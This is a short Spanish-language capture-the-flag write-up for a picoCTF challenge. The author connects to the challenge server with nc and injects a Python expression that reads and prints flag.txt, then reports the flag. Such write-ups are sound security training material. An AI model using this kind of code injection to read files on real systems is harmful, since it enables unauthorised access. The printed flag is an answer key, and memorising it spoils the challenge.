
### Descripcion

Can you figure out how this program works to get the flag?

Additional details will be available after launching your challenge instance.

### Solucion

```

Solo se tiene que conectar al servidor que se nos da, una vez conectados se tiene que introducir un comando que anterior mente vimos en el documento que nos dieron a descargar:

guillermo@MacBook-Pro-de-Guillermo PICO % nc saturn.picoctf.net 53651

==> print( open('flag.txt', 'r').read() )

picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}

'NoneType' object is not callable

guillermo@MacBook-Pro-de-Guillermo PICO %


Flag: picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}

```

### Notas



## Referencias